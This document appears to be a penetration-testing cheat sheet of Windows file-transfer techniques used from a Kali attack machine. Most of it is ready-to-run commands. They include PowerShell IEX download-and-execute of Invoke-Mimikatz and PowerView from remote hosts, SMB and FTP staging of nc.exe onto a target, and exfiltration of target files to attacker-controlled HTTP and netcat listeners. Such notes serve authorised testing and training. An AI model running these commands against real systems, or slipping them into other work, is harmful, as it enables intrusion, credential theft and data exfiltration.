# Windows File Transfer

## Download Operations

### Powershell Base64 Encode & Decode

On Kali : 
```
1) Check MD5 hash

$ md5sum id_rsa

2) Encode to Base64, and copy result

$ cat id_rsa |base64 -w 0;echo
```

On Windows target :

```
3) Paste Base64 result in this powershell function to decode it :

[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("[PASTE HERE]"))

4) And confirming the MD5 hash :

Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### Powershell Web Downloads

On Windows target :

```
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### SMB Downloads

On Kali, create the smb server with password :
```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On windows target, mount the SMB server : 

```
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP Downloads

On Kali, create FTP server : 

```
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port 21
```

On Windows target, download file : 

```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Upload Operations

### Powershell Base64 Encode & Decode

On Windows target, encode file : 

```
1) Encode and copy base64 string :
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

2) Get MD5 hash : 
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

On Kali : 

```
$ echo [PASTE BASE64] | base64 -d > hosts
$ md5sum hosts
```

### Powershell Web Uploads

On Kali, create HTTP server : 

```
$ pip3 install uploadserver
$ python3 -m uploadserver
```

On Windows target, download file : 

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Powershell Base64 web upload

On windows target, encoded file in base64 : 

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

On Kali, start listener : 

```
$ nc -lvnp 8000
```

On windows target send the POST request : 

```
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

And finally, on kali copy/paste the base64 for decoded : 

```
$ echo <base64> | base64 -d -w 0 > hosts
```

